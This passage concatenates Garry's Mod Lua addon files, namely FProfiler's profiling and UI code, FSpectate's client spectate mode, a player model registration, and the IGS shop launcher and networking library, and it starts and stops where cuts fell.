end

--[[-------------------------------------------------------------------------
Profiling control
---------------------------------------------------------------------------]]

-- Start profiling
-- focus: only measure data of everything that happens within a certain function
function FProfiler.Internal.start(focus)
    -- Empty start times, so unfinished functions aren't
    -- registered as returns on a second profiling session
    -- local time = SysTime()
    -- for k,v in pairs(startTimes) do startTimes[k] = time end
    table.Empty(startTimes)
    table.Empty(recursiveCount)

    debug.sethook(function(event) onLuaEvent(event, focus) end, "cr")
end


-- Stop profiling
function FProfiler.Internal.stop()
    debug.sethook()
end

-- Reset all profiling data
function FProfiler.Internal.reset()
    FProfiler.Internal.resetCallCounts()
    FProfiler.Internal.resetInclusiveTimes()
    FProfiler.Internal.resetMostExpensiveSingleCalls()
end

--PATH addons/_fpr/lua/fprofiler/ui/model.lua:
--[[-------------------------------------------------------------------------
The model describes the data that the drives the UI
Loosely based on the Elm architecture
---------------------------------------------------------------------------]]

local model =
    {
        realm = "client", -- "client" or "server"
        serverAccess = false, -- Whether the player has access to profile the server
        frameVisible = false, -- Whether the frame is visible

        client = {
            status = "Stopped", -- Started or Stopped
            shouldReset = true, -- Whether profiling should start anew
            recordTime = 0, -- Total time spent on the last full profiling session
            sessionStart = nil, -- When the last profiling session was started
            sessionStartSysTime = nil, -- When the last profiling session was started, measured in SysTime
            bottlenecks = {}, -- The list of bottleneck functions
            topLagSpikes = {}, -- Top of lagging functions
            currentSelected = nil, -- Currently selected function

            focusObj = nil, -- The current function being focussed upon in profiling
            focusStr = "", -- The current function name being entered

            toConsole = nil, -- Any functions that should be printed to console

            sourceText = "", -- The text of the source function (if available)
        },

        server = {
            status = "Stopped", -- Started or Stopped
            shouldReset = true, -- Whether profiling should start anew
            bottlenecks = {}, -- The list of bottleneck functions
            recordTime = 0, -- Total time spent on the last full profiling session
            sessionStart = nil, -- When the last profiling session was started
            topLagSpikes = {}, -- Top of lagging functions
            currentSelected = nil, -- Currently selected function

            focusObj = nil, -- The current function being focussed upon in profiling
            focusStr = "", -- The current function name

            toConsole = nil, -- Any functions that should be printed to console

            sourceText = "", -- The text of the source function (if available)
            fromServer = false, -- Whether a change of the model came from the server.
        },
    }


local updaters = {}


--[[-------------------------------------------------------------------------
Update the model.
Automatically calls the registered update hook functions

e.g. updating the realm would be:
FProfiler.UI.updateModel("realm", "server")
---------------------------------------------------------------------------]]
function FProfiler.UI.updateModel(path, value)
    path = istable(path) and path or {path}

    local updTbl = updaters
    local mdlTbl = model
    local key = path[#path]

    for i = 1, #path - 1 do
        mdlTbl = mdlTbl[path[i]]
        updTbl = updTbl and updTbl[path[i]]
    end

    local oldValue = mdlTbl[key]
    mdlTbl[key] = value

    for _, updFunc in ipairs(updTbl and updTbl[key] or {}) do
        updFunc(value, oldValue)
    end
end

--[[-------------------------------------------------------------------------
Update the model of the current realm
---------------------------------------------------------------------------]]
function FProfiler.UI.updateCurrentRealm(path, value)
    path = istable(path) and path or {path}

    table.insert(path, 1, model.realm)

    FProfiler.UI.updateModel(path, value)
end

--[[-------------------------------------------------------------------------
Retrieve a value of the model
---------------------------------------------------------------------------]]
function FProfiler.UI.getModelValue(path)
    path = istable(path) and path or {path}

    local mdlTbl = model
    local key = path[#path]

    for i = 1, #path - 1 do
        mdlTbl = mdlTbl[path[i]]
    end

    return mdlTbl[key]
end

--[[-------------------------------------------------------------------------
Retrieve a value of the model regardless of realm
---------------------------------------------------------------------------]]
function FProfiler.UI.getCurrentRealmValue(path)
    path = istable(path) and path or {path}

    table.insert(path, 1, model.realm)

    return FProfiler.UI.getModelValue(path)
end

--[[-------------------------------------------------------------------------
Registers a hook that gets triggered when a certain part of the model is updated
e.g. FProfiler.UI.onModelUpdate("realm", print) prints when the realm is changed
---------------------------------------------------------------------------]]
function FProfiler.UI.onModelUpdate(path, func)
    path = istable(path) and path or {path}

    local updTbl = updaters
    local mdlTbl = model
    local key = path[#path]

    for i = 1, #path - 1 do
        mdlTbl = mdlTbl[path[i]]
        updTbl[path[i]] = updTbl[path[i]] or {}
        updTbl = updTbl[path[i]]
    end

    updTbl[key] = updTbl[key] or {}

    table.insert(updTbl[key], func)

    -- Call update with the initial value
    if mdlTbl[key] ~= nil then
        func(mdlTbl[key], mdlTbl[key])
    end
end

--[[-------------------------------------------------------------------------
Registers a hook to both realms
---------------------------------------------------------------------------]]
function FProfiler.UI.onCurrentRealmUpdate(path, func)
    path = istable(path) and path or {path}

    table.insert(path, 1, "client")
    FProfiler.UI.onModelUpdate(path, function(...)
        if FProfiler.UI.getModelValue("realm") == "server" then return end

        func(...)
    end)

    path[1] = "server"
    FProfiler.UI.onModelUpdate(path, function(...)
        if FProfiler.UI.getModelValue("realm") == "client" then return end

        func(...)
    end)
end

--[[-------------------------------------------------------------------------
When the realm is changed, all update functions of the new realm are to be called
---------------------------------------------------------------------------]]
FProfiler.UI.onModelUpdate("realm", function(new, old)
    if not updaters[new] then return end

    for k, funcTbl in pairs(updaters[new]) do
        for _, func in ipairs(funcTbl) do
            func(model[new][k], model[new][k])
        end
    end
end)


--PATH addons/_fpr/lua/fprofiler/ui/servercontrol.lua:
local get, update, onUpdate = FProfiler.UI.getModelValue, FProfiler.UI.updateModel, FProfiler.UI.onModelUpdate


--[[-------------------------------------------------------------------------
Update the current selected focus object when data is entered
---------------------------------------------------------------------------]]
onUpdate({"server", "focusStr"}, function(new)
    if not new or get({"server", "fromServer"}) then return end

    net.Start("FProfile_focusObj")
        net.WriteString(new)
    net.SendToServer()
end)

net.Receive("FProfile_focusObj", function()
    update({"server", "focusObj"}, net.ReadBool() and get({"server", "focusStr"}) or nil)
end)

-- A focus update occurs when someone else changes the focus
net.Receive("FProfile_focusUpdate", function()
    update({"server", "fromServer"}, true)

    local focusStr = net.ReadString()
    update({"server", "focusStr"}, focusStr)
    update({"server", "focusObj"}, net.ReadBool() and focusStr or nil)

    update({"server", "fromServer"}, false)
end)

--[[-------------------------------------------------------------------------
(Re)start profiling
---------------------------------------------------------------------------]]
local function restartProfiling()
    local shouldReset = get({"server", "shouldReset"})

    net.Start("FProfile_startProfiling")
        net.WriteBool(shouldReset)
    net.SendToServer()
end

net.Receive("FProfile_startProfiling", function()
    update({"server", "fromServer"}, true)
    update({"server", "status"}, "Started")
    update({"server", "recordTime"}, net.ReadDouble())
    update({"server", "sessionStart"}, net.ReadDouble())
    update({"server", "fromServer"}, false)
end)


--[[-------------------------------------------------------------------------
Stop profiling
---------------------------------------------------------------------------]]
local function stopProfiling()
    net.Start("FProfile_stopProfiling")
    net.SendToServer()
end

-- Read a row from a net message
local function readDataRow(countSize, readSpecific)
    local res = {}

    local count = net.ReadUInt(countSize)

    for i = 1, count do
        local row = {}
        row.info = {}

        row.func = net.ReadString()
        row.info.short_src = net.ReadString()
        row.info.linedefined = net.ReadUInt(16)
        row.info.lastlinedefined = net.ReadUInt(16)

        readSpecific(row)

        table.insert(res, row)
    end

    return res
end

-- Read a bottleneck row
local function readBottleneckRow(row)
    local nameCount = net.ReadUInt(8)

    row.names = {}
    for i = 1, nameCount do
        table.insert(row.names, {
            name = net.ReadString(),
            namewhat = net.ReadString()
        })
    end

    row.total_called = net.ReadUInt(32)
    row.total_time = net.ReadDouble()
    row.average_time = net.ReadDouble()
end

-- Read the top n row
local function readTopNRow(row)
    row.info.name = net.ReadString()
    row.info.namewhat = net.ReadString()
    row.runtime = net.ReadDouble()
end

net.Receive("FProfile_stopProfiling", function()
    update({"server", "fromServer"}, true)
    update({"server", "status"}, "Stopped")
    update({"server", "sessionStart"}, nil)
    update({"server", "recordTime"}, net.ReadDouble())

    update({"server", "bottlenecks"}, readDataRow(16, readBottleneckRow))
    update({"server", "topLagSpikes"}, readDataRow(8, readTopNRow))
    update({"server", "fromServer"}, false)
end)


--[[-------------------------------------------------------------------------
Start/stop recording when the recording status is changed
---------------------------------------------------------------------------]]
onUpdate({"server", "status"}, function(new, old)
    if new == old or get({"server", "fromServer"}) then return end
    (new == "Started" and restartProfiling or stopProfiling)()
end)


--[[-------------------------------------------------------------------------
Update info when a different line is selected
---------------------------------------------------------------------------]]
onUpdate({"server", "currentSelected"}, function(new)
    if not new or not new.info or not new.info.linedefined or not new.info.lastlinedefined or not new.info.short_src then return end

    net.Start("FProfile_getSource")
        net.WriteString(tostring(new.func))
    net.SendToServer()
end)

net.Receive("FProfile_getSource", function()
    update({"server", "sourceText"}, net.ReadString())
end)


--[[-------------------------------------------------------------------------
When a function is to be printed to console
---------------------------------------------------------------------------]]
onUpdate({"server", "toConsole"}, function(data)
    if not data then return end

    update({"server", "toConsole"}, nil)

    net.Start("FProfile_printFunction")
        net.WriteBool(data.total_called and true or false) -- true for bottleneck function, false for top-n function
        net.WriteString(tostring(data.func))
    net.SendToServer()
end)

net.Receive("FProfile_printFunction", function(len)
    local data = net.ReadData(len)
    local decompressed = util.Decompress(data)

    -- Print the text line by line, otherwise big parts of big data will not be printed
    local split = string.Explode("\n", decompressed, false)
    for _, line in ipairs(split) do
        MsgN(line)
    end

    -- Write the thing to a file
    file.CreateDir("fprofiler")
    file.Write("fprofiler/profiledata.txt", showStr(data))
    MsgC(Color(200, 200, 200), "-----", Color(120, 120, 255), "NOTE", Color(200, 200, 200), "---------------\n")
    MsgC(Color(200, 200, 200), "In the server's console you can find a colour coded version of the above output.\nIf the above function does not fit in console, you can find it in data/fprofiler/profiledata.txt\n\n")
end)


--[[-------------------------------------------------------------------------
Check access when the frame opens
Also request a full serverside model update
---------------------------------------------------------------------------]]
onUpdate("frameVisible", function(isOpen)
    -- Don't network if the server doesn't have FProfiler installed
    if util.NetworkStringToID("FProfile_fullModelUpdate") == 0 then
        update("serverAccess", false)
        return
    end

    -- Update access
    CAMI.PlayerHasAccess(LocalPlayer(), "FProfiler", function(b, _)
        update("serverAccess", b)
    end)

    if not isOpen then
        net.Start("FProfile_unsubscribe")
        net.SendToServer()

        return
    end

    net.Start("FProfile_fullModelUpdate")
    net.SendToServer()
end)


net.Receive("FProfile_fullModelUpdate", function()
    update({"server", "fromServer"}, true)

    local focusExists = net.ReadBool()
    if focusExists then
        local focus = net.ReadString()
        update({"server", "focusObj"}, focus)
        update({"server", "focusStr"}, focus)
    end

    local startingTimeExists = net.ReadBool()

    if startingTimeExists then
        update({"server", "status"}, "Started")
        update({"server", "sessionStart"}, net.ReadDouble())
    else
        update({"server", "status"}, "Stopped")
    end

    update({"server", "recordTime"}, net.ReadDouble())

    update({"server", "bottlenecks"}, readDataRow(16, readBottleneckRow))
    update({"server", "topLagSpikes"}, readDataRow(8, readTopNRow))

    update({"server", "fromServer"}, false)
end)


--PATH addons/__main/lua/fspectate/cl_init.lua:
FSpectate = {}

local stopSpectating, startFreeRoam
local isSpectating = false
local specEnt
local thirdperson = true
local isRoaming = false
local roamPos -- the position when roaming free
local roamVelocity = Vector(0)
local thirdPersonDistance = 100

/*---------------------------------------------------------------------------
Retrieve the current spectated player
---------------------------------------------------------------------------*/
function FSpectate.getSpecEnt()
    if isSpectating and not isRoaming then
        return IsValid(specEnt) and specEnt or nil
    else
        return nil
    end
end

/*---------------------------------------------------------------------------
startHooks
FAdmin tab buttons
---------------------------------------------------------------------------*/
hook.Add("Initialize", "FSpectate", function()
    surface.CreateFont("UiBold", {
        size = 16,
        weight = 800,
        antialias = true,
        shadow = false,
        font = "Verdana"})

    if not FAdmin then return end
    FAdmin.StartHooks["zzSpectate"] = function()
        FAdmin.Commands.AddCommand("Spectate", nil, "<Player>")

        -- Right click option
        FAdmin.ScoreBoard.Main.AddPlayerRightClick("Spectate", function(ply)
            if not IsValid(ply) then return end
            RunConsoleCommand("FSpectate", ply:UserID())
        end)

        local canSpectate = false
        local function calcAccess()
            CAMI.PlayerHasAccess(LocalPlayer(), "FSpectate", function(b, _)
                canSpectate = b
            end)
        end
        calcAccess()

        -- Spectate option in player menu
        FAdmin.ScoreBoard.Player:AddActionButton("Spectate", "fadmin/icons/spectate", Color(0, 200, 0, 255), function(ply) calcAccess() return canSpectate and ply ~= LocalPlayer() end, function(ply)
            if not IsValid(ply) then return end
            RunConsoleCommand("FSpectate", ply:UserID())
        end)
    end
end)

/*---------------------------------------------------------------------------
Get the thirdperson position
---------------------------------------------------------------------------*/
local function getThirdPersonPos(ent)
    local aimvector = LocalPlayer():GetAimVector()
    local startPos = ent:IsPlayer() and ent:GetShootPos() or ent:LocalToWorld(ent:OBBCenter())
    local endpos = startPos - aimvector * thirdPersonDistance

    local tracer = {
        start = startPos,
        endpos = endpos,
        filter = specEnt
    }

    local trace = util.TraceLine(tracer)

    return trace.HitPos + trace.HitNormal * 10
end

/*---------------------------------------------------------------------------
Get the CalcView table
---------------------------------------------------------------------------*/
local view = {}
local function getCalcView()
    if not isRoaming then
        if thirdperson then
            view.origin = getThirdPersonPos(specEnt)
            view.angles = LocalPlayer():EyeAngles()
        else
            view.origin = specEnt:IsPlayer() and specEnt:GetShootPos() or specEnt:LocalToWorld(specEnt:OBBCenter())
            view.angles = specEnt:IsPlayer() and specEnt:EyeAngles() or specEnt:GetAngles()
        end

        roamPos = view.origin
        view.drawviewer = false

        return view
    end

    view.origin = roamPos
    view.angles = LocalPlayer():EyeAngles()
    view.drawviewer = true

    return view
end

/*---------------------------------------------------------------------------
specCalcView
Override the view for the player to look through the spectated player's eyes
---------------------------------------------------------------------------*/
local function specCalcView(ply, origin, angles, fov)
    if not IsValid(specEnt) and not isRoaming then
        startFreeRoam()
        return
    end

    view = getCalcView()

    if IsValid(specEnt) then
        specEnt:SetNoDraw(not thirdperson)
    end

    return view
end

/*---------------------------------------------------------------------------
Find the right player to spectate
---------------------------------------------------------------------------*/
local function findNearestObject()
    local aimvec = LocalPlayer():GetAimVector()

    local fromPos = not isRoaming and IsValid(specEnt) and specEnt:EyePos() or roamPos

    local lookingAt = util.QuickTrace(fromPos, aimvec * 5000, LocalPlayer())
    local ent = lookingAt.Entity

    if IsValid(ent) then return ent end

    local foundPly, foundDot = nil, 0

    for _, ply in ipairs(player.GetAll()) do
        if not IsValid(ply) or ply == LocalPlayer() then continue end

        local pos = ply:GetShootPos()
        local dot = (pos - fromPos):GetNormalized():Dot(aimvec)

        -- Discard players you're not looking at
        if dot < 0.97 then continue end
        -- not a better alternative
        if dot < foundDot then continue end

        local trace = util.QuickTrace(fromPos, pos - fromPos, ply)

        if trace.Hit then continue end

        foundPly, foundDot = ply, dot
    end

    return foundPly
end

/*---------------------------------------------------------------------------
Spectate the person you're looking at while you're roaming
---------------------------------------------------------------------------*/
local function spectateLookingAt()
    local obj = findNearestObject()

    if not IsValid(obj) then return end

    isRoaming = false
    specEnt = obj

    net.Start("FSpectateTarget")
        net.WriteEntity(obj)
    net.SendToServer()
end

/*---------------------------------------------------------------------------
specBinds
Change binds to perform spectate specific tasks
---------------------------------------------------------------------------*/
-- Manual keysDown table, so I can return true in plyBindPress and still detect key presses
local keysDown = {}
local function specBinds(ply, bind, pressed)
    local key = input.LookupBinding(bind)

    if bind == "+jump" then
        stopSpectating()
        return true
    elseif bind == "+reload" and pressed then
        local pos = getCalcView().origin - Vector(0, 0, 64)
        RunConsoleCommand("FTPToPos", string.format("%d, %d, %d", pos.x, pos.y, pos.z),
            string.format("%d, %d, %d", roamVelocity.x, roamVelocity.y, roamVelocity.z))
        stopSpectating()
    elseif bind == "+attack" and pressed then
        if not isRoaming then
            startFreeRoam()
        else
            spectateLookingAt()
        end
        return true
    elseif bind == "+attack2" and pressed then
        if isRoaming then
            roamPos = roamPos + LocalPlayer():GetAimVector() * 500
            return true
        end
        thirdperson = not thirdperson

        return true
    elseif isRoaming and not LocalPlayer():KeyDown(IN_USE) then
        local keybind = string.upper(string.match(bind, "+([a-z A-Z 0-9]+)") or "")
        if not keybind or keybind == "USE" or keybind == "SHOWSCORES" or string.find(bind, "messagemode") then return end

        keysDown[keybind] = pressed

        return true
    elseif not isRoaming and thirdperson and (key == "MWHEELDOWN" or key == "MWHEELUP") then
        thirdPersonDistance = thirdPersonDistance + 10 * (key == "MWHEELDOWN" and 1 or -1)
    end
    -- Do not return otherwise, spectating admins should be able to move to avoid getting detected
end

/*---------------------------------------------------------------------------
Scoreboardshow
Set to main view when roaming, open on a player when spectating
---------------------------------------------------------------------------*/
local function fadminmenushow()
    if isRoaming then
        FAdmin.ScoreBoard.ChangeView("Main")
    elseif IsValid(specEnt) and specEnt:IsPlayer() then
        FAdmin.ScoreBoard.ChangeView("Main")
        FAdmin.ScoreBoard.ChangeView("Player", specEnt)
    end
end


/*---------------------------------------------------------------------------
RenderScreenspaceEffects
Draws the lines from players' eyes to where they are looking
---------------------------------------------------------------------------*/
local LineMat = Material("cable/new_cable_lit")
local linesToDraw = {}
local function lookingLines()
    if not linesToDraw[0] then return end

    render.SetMaterial(LineMat)

    cam.Start3D(view.origin, view.angles)
        for i = 0, #linesToDraw, 3 do
            render.DrawBeam(linesToDraw[i], linesToDraw[i + 1], 4, 0.01, 10, linesToDraw[i + 2])
        end
    cam.End3D()
end

/*---------------------------------------------------------------------------
gunpos
Gets the position of a player's gun
---------------------------------------------------------------------------*/
local function gunpos(ply)
    local wep = ply:GetActiveWeapon()
    if not IsValid(wep) then return ply:EyePos() end
    local att = wep:GetAttachment(1)
    if not att then return ply:EyePos() end
    return att.Pos
end

/*---------------------------------------------------------------------------
Spectate think
Free roaming position updates
---------------------------------------------------------------------------*/
local function specThink()
    local ply = LocalPlayer()

    -- Update linesToDraw
    local pls = player.GetAll()
    local lastPly = 0
    local skip = 0
    for i = 0, #pls - 1 do
        local p = pls[i + 1]
        if not IsValid(p) then continue end
        if not isRoaming and p == specEnt and not thirdperson then skip = skip + 3 continue end

        local tr = p:GetEyeTrace()
        local sp = gunpos(p)

        local pos = i * 3 - skip

        linesToDraw[pos] = tr.HitPos
        linesToDraw[pos + 1] = sp
        linesToDraw[pos + 2] = team.GetColor(p:Team())
        lastPly = i
    end

    -- Remove entries from linesToDraw that don't match with a player anymore
    for i = #linesToDraw, lastPly * 3 + 3, -1 do linesToDraw[i] = nil end

    if not isRoaming or keysDown["USE"] then return end

    local roamSpeed = 1000
    local aimVec = ply:GetAimVector()
    local direction
    local frametime = RealFrameTime()

    if keysDown["FORWARD"] then
        direction = aimVec
    elseif keysDown["BACK"] then
        direction = -aimVec
    end

    if keysDown["MOVELEFT"] then
        local right = aimVec:Angle():Right()
        direction = direction and (direction - right):GetNormalized() or -right
    elseif keysDown["MOVERIGHT"] then
        local right = aimVec:Angle():Right()
        direction = direction and (direction + right):GetNormalized() or right
    end

    if keysDown["SPEED"] then
        roamSpeed = 2500
    elseif keysDown["WALK"] or keysDown["DUCK"] then
        roamSpeed = 300
    end

    roamVelocity = (direction or Vector(0, 0, 0)) * roamSpeed

    roamPos = roamPos + roamVelocity * frametime
end

/*---------------------------------------------------------------------------
Draw help on the screen
---------------------------------------------------------------------------*/
local uiForeground, uiBackground = Color(240, 240, 255, 255), Color(20, 20, 20, 120)
local red = Color(255, 0, 0, 255)
local function drawHelp()
    local scrHalfH = math.floor(ScrH() * 0.5)
    draw.WordBox(2, 10, scrHalfH, "Left click: (Un)select player to spectate", "UiBold", uiBackground, uiForeground)
    draw.WordBox(2, 10, scrHalfH + 20, isRoaming and "Right click: quickly move forwards" or "Right click: toggle thirdperson", "UiBold", uiBackground, uiForeground)
    draw.WordBox(2, 10, scrHalfH + 40, "Jump: Stop spectating", "UiBold", uiBackground, uiForeground)
    draw.WordBox(2, 10, scrHalfH + 60, "Reload: Stop spectating and teleport", "UiBold", uiBackground, uiForeground)

    if FAdmin then
        draw.WordBox(2, 10, scrHalfH + 80, "Opening FAdmin's menu while spectating a player", "UiBold", uiBackground, uiForeground)
        draw.WordBox(2, 10, scrHalfH + 100, "\twill open their page!", "UiBold", uiBackground, uiForeground)
    end


    local target = findNearestObject()
    local pls = player.GetAll()
    for i = 1, #pls do
        local ply = pls[i]
        if not IsValid(ply) then continue end
        if not isRoaming and ply == specEnt then continue end

        local pos = ply:GetShootPos():ToScreen()
        if not pos.visible then continue end

        local x, y = pos.x, pos.y

        draw.RoundedBox(2, x, y - 6, 12, 12, team.GetColor(ply:Team()))
        draw.WordBox(2, x, y - 66, ply:Nick(), "UiBold", uiBackground, uiForeground)
        draw.WordBox(2, x, y - 46, "Health: " .. ply:Health(), "UiBold", uiBackground, uiForeground)
        draw.WordBox(2, x, y - 26, ply:GetUserGroup(), "UiBold", uiBackground, uiForeground)
    end

    if not isRoaming then return end

    if not IsValid(target) then return end

    local center = target:LocalToWorld(target:OBBCenter())
    local eyeAng = EyeAngles()
    local rightUp = eyeAng:Right() * 16 + eyeAng:Up() * 36
    local topRight = (center + rightUp):ToScreen()
    local bottomLeft = (center - rightUp):ToScreen()

    draw.RoundedBox(12, bottomLeft.x, bottomLeft.y, math.max(20, topRight.x - bottomLeft.x), topRight.y - bottomLeft.y, red)
    draw.WordBox(2, bottomLeft.x, bottomLeft.y + 12, "Left click to spectate!", "UiBold", uiBackground, uiForeground)
end

/*---------------------------------------------------------------------------
Start roaming free, rather than spectating a given player
---------------------------------------------------------------------------*/
startFreeRoam = function()
    roamPos = isSpectating and roamPos or LocalPlayer():GetShootPos()

    if IsValid(specEnt) then
        if specEnt:IsPlayer() then
            roamPos = thirdperson and getThirdPersonPos(specEnt) or specEnt:GetShootPos()
        end
        specEnt:SetNoDraw(false)
    end

    specEnt = nil
    isRoaming = true
    keysDown = {}
end

/*---------------------------------------------------------------------------
specEnt
Spectate a player
---------------------------------------------------------------------------*/
local function startSpectate(um)
    isRoaming = net.ReadBool()
    specEnt = net.ReadEntity()
    specEnt = IsValid(specEnt) and specEnt or nil

    if isRoaming then
        startFreeRoam()
    end

    isSpectating = true
    keysDown = {}

    hook.Add("CalcView", "FSpectate", specCalcView)
    hook.Add("PlayerBindPress", "FSpectate", specBinds)
    hook.Add("ShouldDrawLocalPlayer", "FSpectate", function() return isRoaming or thirdperson end)
    hook.Add("Think", "FSpectate", specThink)
    hook.Add("HUDPaint", "FSpectate", drawHelp)
    hook.Add("FAdmin_ShowFAdminMenu", "FSpectate", fadminmenushow)
    hook.Add("RenderScreenspaceEffects", "FSpectate", lookingLines)

    timer.Create("FSpectatePosUpdate", 0.5, 0, function()
        if not isRoaming then return end

        RunConsoleCommand("_FSpectatePosUpdate", roamPos.x, roamPos.y, roamPos.z)
    end)
end
net.Receive("FSpectate", startSpectate)

/*---------------------------------------------------------------------------
stopSpectating
Stop spectating a player
---------------------------------------------------------------------------*/
stopSpectating = function()
    hook.Remove("CalcView", "FSpectate")
    hook.Remove("PlayerBindPress", "FSpectate")
    hook.Remove("ShouldDrawLocalPlayer", "FSpectate")
    hook.Remove("Think", "FSpectate")
    hook.Remove("HUDPaint", "FSpectate")
    hook.Remove("FAdmin_ShowFAdminMenu", "FSpectate")
    hook.Remove("RenderScreenspaceEffects", "FSpectate")

    timer.Remove("FSpectatePosUpdate")

    if IsValid(specEnt) then
        specEnt:SetNoDraw(false)
    end

    RunConsoleCommand("FSpectate_StopSpectating")
    isSpectating = false
end

--PATH addons/__main_only_1st/lua/autorun/jack_skel_player.lua:
player_manager.AddValidModel( "Jack Skellington", "models/vinrax/player/Jack_player.mdl" );
list.Set( "PlayerOptionsModel",  "Jack Skellington", 					"models/vinrax/player/Jack_player.mdl" )
player_manager.AddValidHands( "Jack Skellington", "models/vinrax/weapons/c_arms_jack.mdl", 0, "00000000" )
--PATH addons/igs-core/lua/igs/launcher.lua:
IGS.C = IGS.C or {} -- config

local function sh(path) return IGS.sh("igs/" .. path) end
local function sv(path) return IGS.sv("igs/" .. path) end
local function cl(path) return IGS.cl("igs/" .. path) end

local function dir(path, fIncluder) return IGS.include_files("igs/" .. path, fIncluder) end
local function mods(path) return IGS.load_modules("igs/" .. path) end


sh("dependencies/plurals.lua")
sh("dependencies/chatprint.lua")
sv("dependencies/stack.lua")
sh("dependencies/scc.lua")
sv("dependencies/resources.lua") -- иконки, моделька дропнутого итема
sh("dependencies/bib.lua")
sh("dependencies/permasents.lua")

-- #todo сделать через require
-- lua/includes/modules отсюда
-- уберет костыль внутри kupol
-- +при фетче оверрайд require
sh("dependencies/lolib.lua") -- должна быть перед kupol
-- sh("dependencies/kupol.lua") -- решил поставлять с модулем

-- Антиконфликт с https://trello.com/c/3ti6xIjW/
sh("dependencies/dash/nw.lua")

-- if not dash then
sh("dependencies/dash/hash.lua")
sh("dependencies/dash/misc.lua")
cl("dependencies/dash/wmat.lua")

sh("settings/config_sh.lua")
sv("settings/config_sv.lua") -- для фетча project key (Генерация подписи)

-- Метаобъекты
sh("objects/level.lua")
sh("objects/shop_group.lua")
sh("objects/shop_item.lua")

sh("network/nw_sh.lua") -- для igs_servers в serv_sv.lua

sv("core_sv.lua") -- для фетча подписи

sv("repeater.lua")
sv("apinator.lua")

-- После датапровайдера, хотя сработают все равно после первого входа игрока
sh("servers/serv_sh.lua")
sv("servers/serv_sv.lua")



--[[-------------------------------------------------------------------------
	Второй "этап" (для работы требовал загрузку серверов)
---------------------------------------------------------------------------]]
sh("utils/ut_sh.lua")
sv("utils/ut_sv.lua")
cl("utils/ut_cl.lua")


-- Нельзя ниже sh_additems
dir("extensions", IGS.sh)

sh("settings/sh_additems.lua")
sh("settings/sh_addlevels.lua")

sv("network/net_sv.lua")
cl("network/net_cl.lua")


cl("interface/skin.lua")
-- cl("core_cl.lua")

-- Подключение VGUI компонентов
dir("interface/vgui", IGS.cl)

cl("interface/core.lua")

dir("interface/activities", IGS.cl)
dir("interface/windows", IGS.cl)

mods("modules")

sv("processor_sv.lua") -- начинаем обработку всего серверного в конце


--[[------------------------------
	Уродский кусок пост хуков
--------------------------------]]
if SERVER then
	hook.Add("IGS.ServersLoaded", "Loaded", function()
		IGS.GetSettings(function(t)
			IGS.UpdateMoneySettings(t["MinCharge"],t["CurrencyPrice"])
			hook.Run("IGS.Loaded")
		end)
	end)
else
	hook.Add("IGS.OnSettingsUpdated","Loaded",function()
		hook.Run("IGS.Loaded")
	end)
end

hook.Run("IGS.Initialized") -- можно создавать итемы

--PATH addons/igs-core/lua/igs/dependencies/dash/nw.lua:
-- Thanks to SuperiorServers.co

IGS.nw = {}

local vars     = {}
local mappings = {}
local data     = {
	[0] = {}
}
local globals   = data[0]
local callbacks = {}

local NETVAR   = {}
NETVAR.__index = NETVAR

debug.getregistry().IGSVar = NETVAR

local bitmap = {
	[3]	  = 3,
	[7]   = 4,
	[15]  = 5,
	[31]  = 6,
	[63]  = 7,
	[127] = 8
}

local bitcount = 2

local ENTITY = FindMetaTable 'Entity'

local pairs  = pairs
local Entity = Entity

local net_WriteUInt = net.WriteUInt
local net_ReadUInt  = net.ReadUInt
local net_Start     = net.Start
local net_Send      = SERVER and net.Send or net.SendToServer
local net_Broadcast = net.Broadcast
local sorted_pairs  = SortedPairsByMemberValue

function IGS.nw.Register(var) -- You must always call this on both the client and server. It will serioulsy break shit if you don't.
	local t = {
		Name = var,
		NetworkString = 'IGS.nw_' .. var,
		WriteFunc = net.WriteType,
		ReadFunc = net.ReadType,
		SendFunc = function(self, ent, value, recipients)
			if (recipients ~= nil) then
				net_Send(recipients)
			else
				net_Broadcast()
			end
		end,
	}
	setmetatable(t, NETVAR)
	vars[var] = t

	if (SERVER) then
		util.AddNetworkString(t.NetworkString)
	else
		net.Receive(t.NetworkString, function()
			local index, value = t:_Read()

			if (not data[index]) then
				data[index] = {}
			end

			data[index][var] = value

			t:_CallHook(index, value)
		end)
	end

	return t:_Construct()
end

function NETVAR:Write(func, opt)
	self.WriteFunc = function(value)
		func(value, opt)
	end
	return self:_Construct()
end

function NETVAR:Read(func, opt)
	self.ReadFunc = function()
		return func(opt)
	end
	return self:_Construct()
end

function NETVAR:Filter(func)
	self.SendFunc = function(_, ent, value, recipients)
		net_Send(recipients or func(ent, value))
	end
	return self:_Construct()
end

function NETVAR:SetPlayer()
	self.PlayerVar = true
	return self:_Construct()
end

function NETVAR:SetLocalPlayer()
	self.LocalPlayerVar = true
	return self:_Construct()
end

function NETVAR:SetGlobal()
	self.GlobalVar = true
	return self:_Construct()
end

function NETVAR:SetNoSync()
	self.NoSync = true
	return self:_Construct()
end

function NETVAR:SetHook(name)
	self.Hook = name
	return self
end

function NETVAR:_Send(ent, value, recipients)
	net_Start(self.NetworkString)
		self:_Write(ent, value)
	self:SendFunc(ent, value, recipients)
end

function NETVAR:_CallHook(index, value)
	if self.Hook then
		if (index ~= 0) then -- not global
			hook.Call(self.Hook, GAMEMODE, Entity(index), value)
		else
			hook.Call(self.Hook, GAMEMODE, value)
		end
	end
end

function NETVAR:_Construct()
	local WriteFunc = self.WriteFunc
	local ReadFunc 	= self.ReadFunc

	if self.PlayerVar then
		self._Write = function(_, ent, value)
			net_WriteUInt(ent:EntIndex(), 7)
			WriteFunc(value)
		end
		self._Read = function(_)
			return net_ReadUInt(7), ReadFunc()
		end
	elseif self.LocalPlayerVar then
		self._Write = function(_, ent, value)
			WriteFunc(value)
		end
		self._Read = function(_)
			return LocalPlayer():EntIndex(), ReadFunc()
		end
		self.SendFunc = function(_, ent, value, recipients)
			net_Send(ent)
		end
	elseif self.GlobalVar then
		self._Write = function(_, ent, value)
			WriteFunc(value)
		end
		self._Read = function(_)
			return 0, ReadFunc()
		end
	else
		self._Write = function(_, ent, value)
			net_WriteUInt(ent:EntIndex(), 12)
			WriteFunc(value)
		end
		self._Read = function(_)
			return net_ReadUInt(12), ReadFunc()
		end
	end

	mappings = {}
	for k, v in sorted_pairs(vars, 'Name', false) do
		local c = #mappings + 1
		vars[k].ID = c
		mappings[c] = v
		if bitmap[c] then
			bitcount = bitmap[c]
		end
	end

	return self
end

function IGS.nw.GetGlobal(var)
	return globals[var]
end

function ENTITY:GetIGSVar(var)
	local index = self:EntIndex()
	return data[index] and data[index][var]
end

if (SERVER) then
